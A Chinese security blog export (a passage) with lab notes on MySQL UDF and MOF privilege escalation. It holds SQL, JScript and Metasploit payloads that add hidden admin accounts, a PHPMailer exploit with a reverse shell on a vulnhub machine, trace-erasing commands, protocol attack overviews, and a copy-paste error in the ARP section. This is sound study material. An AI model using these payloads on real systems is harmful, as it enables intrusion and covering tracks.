class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将swanQ加入管理员组</span></span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net user swanQ swanQ/add&#x27;</span>); </span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net localgroup administrators swanQ/add&#x27;</span>);   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 清除痕迹:删除函数</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> cmdshell;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;cmdshell&#x27;</span>  </span><br></pre></td></tr></table></figure>



<h2 id="3-漏洞复现：PHPMailer命令执行利用"><a href="#3-漏洞复现：PHPMailer命令执行利用" class="headerlink" title="3.漏洞复现：PHPMailer命令执行利用"></a>3.漏洞复现：PHPMailer命令执行利用</h2><h3 id="001-环境搭建"><a href="#001-环境搭建" class="headerlink" title="001 环境搭建"></a>001 环境搭建</h3><p><a href="https://download.vulnhub.com/raven/Raven2.ova">靶机下载</a></p>
<p>攻击机：kali 192.168.127.130</p>
<p>靶机：Raven 192.168.127.129</p>
<p>靶机开放了SSH22端口、80和111端口。访问靶机的80端口可查看wordpress博客页面，dirb跑一下目录。发现phpmailer，并查看版本信息，发现存在php命令执行漏洞。找到靶机发邮件的位置contact.php。</p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/10.jpg"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/11.jpg"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/12.jpg"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit phpmailer</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 定位exp位置</span></span><br><span class="line">locate exploits/php/webapps/40974.py</span><br></pre></td></tr></table></figure>

<p>更改参数后，运行代码，此时目录下会生成back.php</p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/14.jpg"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/13.jpg"></p>
<p>开启本地监听，back.php文件运行后shell会成功反弹。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 监听端口</span></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 得到交互式shell:</span></span><br><span class="line">python -c ’import pty; pty.spawn(&quot;/bin/bash&quot;)’</span><br></pre></td></tr></table></figure>

<h1 id="0x03-MOF提权"><a href="#0x03-MOF提权" class="headerlink" title="0x03 MOF提权"></a>0x03 MOF提权</h1><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>MOF(托管对象格式)是windows系统C:/Windows/system32/wbem/mof/nullevt.mof文件，其作用是每间隔5秒就监听进程的创建和死亡。</p>
<p>如果通过mysql使用load_file将文件写入/wbom/mof。mof中有vbs脚本，可以通过控制脚本内容让系统执行命令来提权。</p>
<h3 id="2-条件"><a href="#2-条件" class="headerlink" title="2.条件"></a>2.条件</h3><ul>
<li><p>windows03及以下版本</p>
</li>
<li><p>mysql有读写C:/Windows/system32/wbem/mof的权限</p>
</li>
<li><p>secure-file-priv参数不为null</p>
</li>
</ul>
<p>msf也自带mof提权模块，且可自动清理痕迹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标 MySQL 的基础信息</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.127.132</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>mof脚本内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line">    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line">    ScriptText &#x3D; </span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd &#x2F;add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker &#x2F;add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   &#x3D; $Consumer; </span><br><span class="line">    Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中核心payload为：</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>将test.mof写入mof目录下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; select load_file(&#39;C:&#x2F;Documents and Settings&#x2F;test.mof&#39;)into dumpfile &quot;C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;test.mof&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行成功test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 ,否则在 c:/windows/system32/wbem/bad 目录下</p>
<p>痕迹清理：</p>
<p>每隔几分钟会重新执行添加用户的命令，所以想清理痕迹得先暂时关闭 winmgmt 服务再删除mof 文件，此时删除用户才有效果。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line"><span class="built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line"><span class="built_in">del</span> C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net <span class="built_in">start</span> winmgmt</span><br></pre></td></tr></table></figure>



<h1 id="0x04-漏洞修复："><a href="#0x04-漏洞修复：" class="headerlink" title="0x04 漏洞修复："></a>0x04 漏洞修复：</h1><p>MySQL数据库更新到最新版本<br>禁止除白名单外其他ip远程登录MySQL数据库<br>修改数据库用户名</p>
<p>思考：</p>
<p>记得是python3跑脚本，不然会遇到python包已安装，但还是找不到的问题。Linux权限管理比Winodws严格，Linux分root用户，组用户和其他用户，然而windows就只有user和administrator。</p>
<p>参考：</p>
<p><a href="https://my.oschina.net/bylibrary/blog/4967585">https://my.oschina.net/bylibrary/blog/4967585</a></p>
<p><a href="https://yeasy.gitbook.io/docker_practice/container">https://yeasy.gitbook.io/docker_practice/container</a></p>
<p><a href="https://www.jianshu.com/p/a4f25b2d74e6">https://www.jianshu.com/p/a4f25b2d74e6</a> </p>
<p><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> </p>
<p><a href="https://blog.csdn.net/yatere/article/details/7654057">https://blog.csdn.net/yatere/article/details/7654057</a></p>
<p><a href="https://www.jianshu.com/p/15321f9ede38">https://www.jianshu.com/p/15321f9ede38</a></p>
<p><a href="https://www.xiaoheidiannao.com/8682.html">https://www.xiaoheidiannao.com/8682.html</a></p>
]]></content>
      <tags>
        <tag>web安全</tag>
        <tag>网络安全</tag>
        <tag>mysql</tag>
        <tag>提权</tag>
        <tag>MOF</tag>
        <tag>UDF</tag>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>一篇文章搞懂所有协议</title>
    <url>/2021/04/15/2021-04-15/</url>
    <content><![CDATA[<h1 id="0x01-DHCP协议"><a href="#0x01-DHCP协议" class="headerlink" title="0x01 DHCP协议"></a>0x01 DHCP协议</h1><p><strong>局域网内分配ip</strong></p>
<p><strong>一、动态主机配置协议DHCP</strong></p>
<p><strong>1.DHCP简介</strong></p>
<p>​        DHCP(Dynamic Host Configuration Protocol),动态主机配置协议，是一个应用层协议。当我们将客户主机ip地址设置为动态获取方式时，DHCP服务器就会根据DHCP协议给客户端分配IP，使得客户机能够利用这个IP上网。</p>
<p>​       DHCP的前身是BOOTP协议（Bootstrap Protocol）,BOOTP被创建出来为连接到网络中的设备自动分配地址，后来被DHCP取代了，DHCP比BOOTP更加复杂，功能更强大。后面可以看到，在用Wireshark过滤显示DHCP包，需要输入过滤条件BOOTP，而不是DHCP,但或许是因为我使用的Wireshark版本是比较旧的1.12.9,没有在新版本中尝试过，也许可以输入DHCP让其只显示DHCP包。</p>
<p><strong>2.工作原理</strong></p>
<p><img src="/2021/04/15/2021-04-15/1.png" alt="img"></p>
<p>DHCP的实现分为4步： </p>
<p>第一步：Client端在局域网内发起一个DHCP　Discover包，目的是想发现能够给它提供IP的DHCP Server。 </p>
<p>第二步：可用的DHCP Server接收到Discover包之后，通过发送DHCP Offer包给予Client端应答，意在告诉Client端它可以提供IP地址。 </p>
<p>第三步：Client端接收到Offer包之后，发送DHCP Request包请求分配IP。 </p>
<p>第四步：DHCP Server发送ACK数据包，确认信息。</p>
<p><strong>二、利用Wireshark抓取DHCP包</strong></p>
<p><strong>1.分析</strong></p>
<p>要想抓取到DHCP包，先要保证有可用的DHCP服务器，然后将主机IP地址获取方式设置为自动获取。如果主机在抓包之前已经联网，需要先断开主机的网络连接，然后再连接网络。</p>
<p>cmd中可以使用ipconfig /?查看各参数的含义： </p>
<p><img src="/2021/04/15/2021-04-15/9.png" alt="img"></p>
<p><strong>(1)ipconfig /release</strong> </p>
<p>断开当前的网络连接，主机IP变为0.0.0.0，主机与网络断开，不能访问网络。 </p>
<p><img src="/2021/04/15/2021-04-15/2.png" alt="img"></p>
<p><strong>(2)ipconfig /renew</strong> </p>
<p>更新适配器信息，请求连接网络，这条命令结束之后，主机会获得一个可用的IP，再次接入网络。</p>
<p><strong>2.开始抓包</strong></p>
<p>实验环境：Win10专业版,Wireshark3.2.7，有线连接 </p>
<p>DHCP服务器IPv4地址：10.170.72.254</p>
<p>本机被分配IP：10.170.56.55</p>
<p><strong>(1)在Wireshark中点击start开始抓包，在过滤栏输入bootp，使其只显示DHCP数据包。</strong> </p>
<p><strong>(2)在cmd中输入ipconfig  /release 断开网络连接。</strong></p>
<p><img src="/2021/04/15/2021-04-15/3.jpg" alt="img"></p>
<p>可以看到此时所有的网卡都已经断开。以太网处于断开状态。 由于开了虚拟机的原因，Wireshark中截获到一个DHCP Release数据包。</p>
<p><strong>(3)在cmd中输入ipconfig /renew 请求网络连接。</strong></p>
<p>此时，可以看到在Wireshark中新增了4个DHCP数据包： </p>
<p><img src="/2021/04/15/2021-04-15/10.jpg" alt="img"></p>
<p>数据包1：DHCP Discover </p>
<p>数据包2：DHCP Offer </p>
<p>数据包3：DHCP Request </p>
<p>数据包4：DHCP ACK</p>
<p>注：当直接手动连接wifi时，直接发起request包(另一台pc)</p>
<p><img src="/2021/04/15/2021-04-15/4.png" alt="img"></p>
<p>等待这条命令执行完毕之后，在cmd中可以看到主机被分配了IP，主机成功连入网络中。</p>
<p><img src="/2021/04/15/2021-04-15/5.jpg" alt="img"></p>
<p><strong>(4)为了后续分析使用，我们再执行一次ipconfig /renew：</strong> </p>
<p>可以看到Wireshark中新增了3个数据包：DHCP ACK；DHCP Request;DHCP ACk。如果再次使用ipconfig /renew,<strong>每执行一次会新增2个数据包：DHCP Request;DHCP ACK</strong>。</p>
<p><strong>三、DHCP包分析</strong></p>
<p>下面着重来分析当执行，ipconfig /renew这条命令产生的4个DHCP数据包，这4个数据包代表了客户机和DHCP服务器的交互过程，也是IP动态分配的过程。 </p>
<p><strong>1.DHCP Discover数据包</strong> </p>
<p>(1)Client端使用IP地址0.0.0.0发送了一个广播包，可以看到此时的目的IP为255.255.255.255。Client想通过这个数据包发现可以给它提供服务的DHCP服务器。</p>
<p>(2)从下图可以看出，DHCP属于应用层协议，它在传输层使用UDP协议，目的端口是67。</p>
<p><img src="/2021/04/15/2021-04-15/11.png" alt="img"></p>
<p><strong>2.DHCP Offer包</strong> </p>
<p>当DHCP服务器收到一条DHCP Discover数据包时，用一个DHCP Offer包给予客户端响应。 </p>
<p><img src="/2021/04/15/2021-04-15/6.png" alt="img"></p>
<p> (1)DHCP服务器使用广播地址作为目的地址，因为此时请求分配IP的Client并没有自己ip,而可能有多个Client在使用0.0.0.0这个IP作为源IP向DHCP服务器发出IP分配请求，DHCP也不能使用0.0.0.0这个IP作为目的IP地址，于是依然采用广播的方式，告诉正在请求的Client们，这是一台可以使用的DHCP服务器。</p>
<p>(2)DHCP服务器<strong>提供了一个可用的IP</strong>,在数据包的Your (client) IP Address字段可以看到DHCP服务器提供的可用IP。</p>
<p>(3)除此之外，如图中红色矩形框的内容所示，服务器还发送了子网掩码，路由器，DNS，域名，IP地址租用期等信息。</p>
<p><strong>3.DHCP Request包</strong> </p>
<p>当Client收到了DHCP Offer包以后（如果有多个可用的DHCP服务器，那么可能会收到多个DHCP Offer包），确认有可以和它交互的DHCP服务器存在，于是Client发送Request数据包，请求分配IP。 </p>
<p><img src="/2021/04/15/2021-04-15/7.png" alt="img"></p>
<p>此时的源IP和目的IP依然是0.0.0.0和255.255.255.255。</p>
<p><strong>4.DHCP ACK包</strong> </p>
<p>服务器用DHCP ACK包对DHCP请求进行响应。 </p>
<p><img src="/2021/04/15/2021-04-15/8.png" alt="img"></p>
<p>在数据包中包含以下信息，表示将这些资源信息分配给Client. </p>
<p><strong>Your(client) IP address:分配给Client的可用IP</strong></p>
<p>后面有许多项option信息，前两项是DHCP服务器发送的消息类型（ACK）和服务器的身份标识，后面几项是： </p>
<p>Subnet Mask:Client端分配到的IP的子网掩码； </p>
<p>Router:路由器 </p>
<p>Domain Name Server:DNS,域名服务器 </p>
<p>Domain Name:域名 </p>
<p>IP Address Lease Time:IP租用期。</p>
<p><strong>四、DHCP starvation attack</strong></p>
<p><strong>1.DHCP starvation attack，DHCP饥饿攻击</strong> </p>
<p>有许多中攻击DHCP的技术，这里介绍其中一种，有点类似于SYN 洪范攻击。 </p>
<p><strong>DHCP starvation attack</strong>，中文即DHCP饥饿攻击，就是大量地进食，把可以吃的食物全部吃完，然后让其他人没得吃，最后给其他人提供一些毒药，把人家毒死。</p>
<p>下面来说这种攻击是如何实现的。一些不法分子，伪造合法的MAC地址，不断地向DHCP服务器发出DHCP Request包，最后<strong>耗尽服务器的可用IP</strong>,于是原有的这台DHCP服务器便不能够给客户端分配IP了，此时不法分子再伪造一台DHCP服务器，给客户端分配IP,将客户端的默认网关和DNS都设置成自己的机器，于是便可以对客户端进行<strong>中间人攻击</strong>。</p>
<p>参考：<a href="https://blog.csdn.net/zqixiao_09/article/details/77131239">https://blog.csdn.net/zqixiao_09/article/details/77131239</a></p>
<h1 id="0x02-ICMP协议"><a href="#0x02-ICMP协议" class="headerlink" title="0x02　ICMP协议"></a>0x02　ICMP协议</h1><p><strong>一、动态主机配置协议ICMP  不可靠</strong></p>
<p><strong>1.ICMP简介</strong></p>
<p>​        网络控制消息协议（Internet Control Message Protocol，ICMP）是网路协议族的核心协议之一。它用于TCP/IP网络中发送控制消息，提供可能发生在通信环境中的各种问题反馈，令管理者可以对所发生的问题作出诊断并采取适当的措施。</p>
<p>​       ICMP 依靠IP来完成它的任务，它是IP的主要部分。它与传输协议，如TCP和UDP显著不同：它一般不用于在两点间传输数据。仅ping和traceroute会用到。 IPv4中的ICMP被称作ICMPv4，IPv6中的ICMP则被称作ICMPv6。</p>
<p>​        ICMP是在RFC 792中定义的互联网协议族之一。通常用于返回的错误信息或是分析路由。ICMP错误消息总是包括了源数据并返回给发送者。 ICMP错误消息的例子之一是TTL值过期。每个路由器在转发数据报的时候都会把IP包头中的TTL值减一。如果TTL值为0，“TTL在传输中过期”的消息将会回报给源地址。 每个ICMP消息都是直接封装在一个IP数据包中的，因此，和UDP一样，ICMP是不可靠的。</p>
<p>​        虽然ICMP是包含在IP数据包中的，但是对ICMP消息通常会特殊处理，会和一般IP数据包的处理不同，而不是作为IP的一个子协议来处理。在很多时候，需要去查看ICMP消息的内容，然后发送适当的错误消息到那个原来产生IP数据包的程序，即那个导致ICMP讯息被传送的IP数据包。</p>
<p>​        很多常用的工具是基于ICMP消息的。</p>
<ul>
<li><strong>traceroute是通过发送包含有特殊的TTL的包，然后接收ICMP超时消息和目标不可达消息来实现的。</strong></li>
<li><strong>ping则是用ICMP的”Echo request”（类别代码：8）和”Echo reply”（类别代码：0）消息来实现的。</strong>ping是一款用于检测一个设备可连接性的工具，用于发送ICMP echo请求数据包。</li>
</ul>
<p><strong>二、利用Wireshark抓取DHCP包</strong></p>
<p><strong>1.ping分析</strong></p>
<p>ping自己服务器</p>
<p><img src="/2021/04/15/2021-04-15/21.png" alt="img"></p>
<p><strong>(1)echo ping请求包request</strong></p>
<p><img src="/2021/04/15/2021-04-15/22.png" alt="img"></p>
<p> ICMP头部的Type以及Code的内容:</p>
<ol>
<li>Type表示ICMP消息基于RFC规范的类型或分类。</li>
<li>Code表示ICMP消息基于RFC规范的子类型。</li>
<li>ICMP头部中的Type的值是8，Code值是0，说明是一个echo请求数据包，所包含的数据很少。除了指定的类型、代码以及校验和，这里还有序列号用于匹配请求和响应，并且在可变域中包含有一串随机字符串。</li>
</ol>
<p><strong>(2)echo ping reply响应包</strong></p>
<p><img src="/2021/04/15/2021-04-15/23.png" alt="img"></p>
<ol>
<li>ICMP头部中，类型和代码的值都是0，表示这是一个echo响应。</li>
<li>第二个数据包的序列号和第一个数据包匹配，确定对应关系</li>
<li>Data的部分，这个数据包和第一个数据包字符相同。说明数据包被成功接收，ping成功。</li>
</ol>
<p><strong>2.安全问题</strong></p>
<p>​        ICMP协议本身的特点就决定了它易于攻击网络上的路由器和主机。</p>
<ol>
<li>DDoS：用户可以利用操作系统规定的ICMP数据包的最大尺寸不超过64K这个规定，向网络上的主机发起Ping of Death攻击。因为当ICMP数据包的大小超过64K的时候，目标主机就有可能出现内存分配的错误的情况，导致TCP/IP堆栈崩溃，使得主机死机。</li>
<li>ICMP风暴：向目标主机长时间、连续、大量地发送ICMP数据包，也会最终使系统瘫痪。大量的ICMP数据包会形成“ICMP风暴”，耗费目标主机大量的CPU资源。</li>
<li>ICMP的echo请求使用的字符串可被利用，攻击者可使用这段内容来推测设备所使用的操作系统。或放置一些数据位用作反向连接。</li>
</ol>
<p><strong>2.路由跟踪</strong></p>
<p><img src="/2021/04/15/2021-04-15/24.png" alt="img"></p>
<p>​       路由跟踪识别一个设备到另一个设备的路径。对于溯源来说，确定数据包从一个地方到另一个地方所走的路径是异常重要的。</p>
<p>​       tracert：利用了ICMP协议，通过其跟踪结果，我们就可以画出数据包所走的路径。总共经过9个跃点到达目标IP </p>
<p>(1)第一个数据包：192.168.137.44 –&gt; 192.168.137.1</p>
<p><img src="/2021/04/15/2021-04-15/25.png" alt="img"></p>
<p>​        类比于此前分析的echo请求。这个数据包是从IP地址为192.168.137.44到47.95.28.98的简单的echo的请求，并且ICMP数据包头部的每一部分都与echo请求数据包相同。数据包的<strong>IP头中的TTL的值为1：****这个数据包会在它所遇到的第一个路由器的地方被丢弃</strong>。由于目标地址47.95.28.98是外网地址，肯定至少存在一个路由器，因此这个数据包不会到达目的地。</p>
<p>(2)第二个数据包： 192.168.137.1 –&gt;192.168.137.44</p>
<p><img src="/2021/04/15/2021-04-15/26.png" alt="img"></p>
<p>​       此数据包是在前往目的地的路径上，第一个路由器发回的reply响应。由于第一个数据包到达192.168.137.1后，TTL的值变成了0，因此就不能够继续传输，此时路由器就回复了一个ICMP响应。这个数据包的类型是11，代码是0，告诉我们这个数据包的TTL在传输中超时，所以目标地址不可达。</p>
<p>​    <strong>ICMP双头包：</strong>在ICMP的结尾部分包含了原echo请求的IP头和ICMP数据的拷贝。因此这个数据包也被叫做ICMP双头包，表示包含有两个ICMP的包头信息。双包头信息在网络故障检修的时候会非常有用。</p>
<p>(3)第三个数据包：找192.168.137.44</p>
<p><img src="/2021/04/15/2021-04-15/27.png" alt="img"></p>
<p>​        TTL为2，保证此数据包到达第二跳的路由。但是即便TTL的值变成了2，从下面的数据包来看，它也是无法到达目的地，直至TTL的值增长到9，这个数据包才到达了目的地。</p>
<p>(4)响应： 192.168.137.1 –&gt;10.170.72.254</p>
<p><img src="/2021/04/15/2021-04-15/28.png" alt="img"></p>
<p>为何在此之前由两个数据包TTL为3呢？说明第二跳已经找到，开始物色第三跳，只不过回应时间稍长而已。</p>
<p>(5)找第三跳</p>
<p>(6)第三跳响应：172.16.255.242–&gt;192.168.137.44</p>
<p><img src="/2021/04/15/2021-04-15/29.png" alt="img"></p>
<p>(6)第四跳响应：113.140.11.97–&gt;192.168.137.44</p>
<p>之后如上</p>
<h1 id="0x03-地址解析协议ARP"><a href="#0x03-地址解析协议ARP" class="headerlink" title="0x03　地址解析协议ARP**"></a>0x03　地址解析协议ARP**</h1><p><strong>1.ARP简介</strong></p>
<p>​          ARP：<strong>IP地址解析为物理地址</strong>（MAC地址）。这里之所以需要使用MAC地址，是因为网络中用于连接各个设备的交换机使用了内容可寻址存储器（CAM，Coment Addressable Memory）。该存储器维护的ARP表列出了它在每一个端口的所有连接设备的MAC地址。</p>
<p>​         当<strong>交换机</strong>收到了一个指向特定MAC地址的网络流量，它就会使用这个表，来确定应该使用哪一个端口发送流量。如果目标MAC地址是未知的，那么这个传输设备会首先在它的缓存中查找这个地址，如果没有找到，那么这个地址就需要通过在网络上额外的通信中解析了。或者我们可以结合下图来说明这个问题：</p>
<p><img src="/2021/04/15/2021-04-15/31.png" alt="img"></p>
<p>​             OSI模型将网络分为了七层，而IP地址位于第三层，也就是网络层，MAC地址位于数据链路层，也就是第二层。那么在通过以太网发送IP数据包的时候，需要首先封装第三层和第二层的报头。但由于发送数据包时只知道目标IP地址，不知道其MAC地址，而又不能直接跨越第二、三层，所以需要地址解析协议。而在使用了ARP协议后，计算机可以按照网络层IP数据包的头部信息，将硬件地址信息（MAC地址）对应起来，以保证通信的顺利进行。ARP协议的基本功能就是将一个已知的IP地址解析成MAC地址，以便主机之间可以正常地通信。</p>
<p>​            ARP协议是在RFC826中定义的。<strong>RFC（Request for Comments）是定义各种协议实现标准的官方文档</strong>。可在RFC Editor的首页搜索RFC文档。</p>
<p><strong>2.工作原理</strong></p>
<p>通过查看RFC826可以知道，其实ARP协议的解析过程只使用了两种数据包：一个ARP请求和一个ARP响应，如下图所示：</p>
<p><img src="/2021/04/15/2021-04-15/32.png" alt="img"></p>
<p>其详细工作原理为：</p>
<p>（1）当主机A想要给主机B发送数据时，主机A会首先在自己的<strong>本地ARP缓存表</strong>中检查与主机B相匹配的MAC地址。</p>
<p>（2）如果主机A在自己的缓存表中没找到主机B的相关条目，那么它就要想办法获取主机B的MAC地址。这就需要将<strong>ARP的请求帧广播</strong>到本地网络上的所有主机中。这个请求<strong>帧包含有主机A的IP地址和MAC地址，以及主机B的IP地址</strong>。网络中凡是收到请求帧的主机都会检查自己的IP地址是否与请求地址一致，如果不一致，则会丢弃该请求帧。对于上图来说，主机C和主机D会丢弃主机A发出的请求帧。</p>
<p>（3）主机B确定ARP请求中的IP地址和自己的IP地址一致，那么就会<strong>将主机A的IP地址和MAC地址添加到本地的缓存列表中</strong>。</p>
<p>（4）主机B将包含有自己<strong>MAC地址的ARP响应消息直接回复给主机A（单播）</strong>。</p>
<p>（5）主机A收到从主机B发来的ARP响应消息后，会<strong>将主机B的IP地址和MAC地址添加到自己的ARP缓存表中</strong>。接下来，主机A就可以向主机B发送消息了。</p>
<p><strong>二、利用Wireshark抓取ARP包</strong></p>
<p>查找局域网内IP：for /L %i IN (1,1,254) DO ping -w 2 -n 1 192.168.9.%i</p>
<p>​                                 arp -a</p>
<p><strong>1.ARP分析</strong></p>
<p>ARP缓存表如下：</p>
<p>本机所在局域网的ARP缓存表为192.168.9.20,每行表示一个ARP条目。缓存表有效期为１２０秒</p>
<p><strong>主机启动时会主动发送ARP应答 刷新邻居的ARP缓存</strong></p>
<p><img src="/2021/04/15/2021-04-15/33.png" alt="img"></p>
<p><strong>(1)ARP请求包request</strong></p>
<p><img src="/2021/04/15/2021-04-15/34.png" alt="img"></p>
<p>１.Ethernet：数据包目的地址是ff:ff:ff:ff:ff:ff，广播地址，说明当前数据包会被广播到当前网段中的所有设备上。</p>
<p>２.ARP请求的头部信息：硬件类型、协议类型、硬件地址长度、协议长度、</p>
<p>３.操作码（该值为1，表示这是一个ARP请求包）、发送方的MAC和IP地址，以及接收方的IP地址。</p>
<p>４.目标MAC地址还是未知的，因此就以全0的形式显示。</p>
<p><strong>(2)ARP reply响应包</strong></p>
<p><img src="/2021/04/15/2021-04-15/35.png" alt="img"></p>
<p>１.目标MAC地址已更新</p>
<p>２.操作码（Opcode）现在是2，表明这是一个用于响应的数据</p>
<p><strong>（３）免费的ARP</strong></p>
<p><img src="/2021/04/15/2021-04-15/36.png" alt="img"></p>
<ol>
<li>以广播的形式发出，网络上的所有主机都能收到它。</li>
<li>发送方的IP地址和接收方的IP地址是一致的。网络中的其它主机收到这个数据包之后，它会让这些主机使用新的IP和MAC地址映射关系来更新它们的ARP表。</li>
<li>由于这个ARP数据包是源主机未经请求主动发出的，并导致了目标主机更新了ARP缓存，所以称之为免费的ARP。</li>
</ol>
<p><strong>2.安全问题</strong></p>
<p>​       ARP协议本身广播不验证的特点就决定了它易于攻击</p>
<ol>
<li>DDoS：用户可以利用操作系统规定的ICMP数据包的最大尺寸不超过64K这个规定，向网络上的主机发起Ping of Death攻击。因为当ICMP数据包的大小超过64K的时候，目标主机就有可能出现内存分配的错误的情况，导致TCP/IP堆栈崩溃，使得主机死机。</li>
<li>ARP欺骗：向目标主机连续、大量地发送假的ARP数据包。</li>
</ol>
]]></content>
      <categories>
        <category>协议</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入总结</title>
    <url>/2021/04/13/2021-04-13/</url>
    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在本篇随笔当中将会介绍什么是SQL注入，如何查找和利用SQL注入及如何防止SQL注入</p>
<p><img src="/2021/04/13/2021-04-13/1.jpg"></p>
<h1 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h1><h2 id="1-原理："><a href="#1-原理：" class="headerlink" title="1. 原理："></a>1. 原理：</h2><p>客户端提交的表单数据被拼接到数据库的查询语句当中,被当作SQL语句的一部分执行。</p>
<p>SQL injection is a web security vulnerability that allows an attacker to  interfere with queries that an application  makes to its databases.It generally allows an attacker to view  data that not normally able to retrive.</p>
<h2 id="2-危害："><a href="#2-危害：" class="headerlink" title="2. 危害："></a>2. 危害：</h2><p>数据库信息泄漏、网页篡改、服务器被远程控制，被安装后门、网站被挂马，传播恶意软件(修改数据库一些字段的值，嵌入网马链接，进行挂马攻击)、数据库被恶意操作(数据库服务器被攻击，数据库的系统管理员帐户被窜改)、破坏硬盘数据，瘫痪全系统。</p>
<h2 id="3-相关-可跳过"><a href="#3-相关-可跳过" class="headerlink" title="3.相关(可跳过)"></a>3.相关(可跳过)</h2><h3 id="a-数据库分类及判断："><a href="#a-数据库分类及判断：" class="headerlink" title="a.数据库分类及判断："></a>a.数据库分类及判断：</h3><p>数据库分关系型数据库和非关系型数据库。</p>
<p><strong>关系型数据库</strong>：主要代表：Mysql、SQL Server、Oracle、PostgreSQL。关系型数据库是指采用了二维表格模型这种关系模型来组织数据的数据库。支持联表查询、使用正则表达式查询、嵌套查询，还可写独立的SQL脚本</p>
<p><strong>非关系型数据库</strong>：主要代表MongoDB，Redis、CouchDB。NoSQL非关系型数据库，主要指那些非关系型的、分布式的，且一般不保证ACID的数据存储系统。NoSQL以键值来存储，且结构不稳定，每个元组字段不同，不局限于固定结构，可以减少时间和空间开销。获取用户的不同信息时，仅需要根据key来取出对应的value值即可。</p>
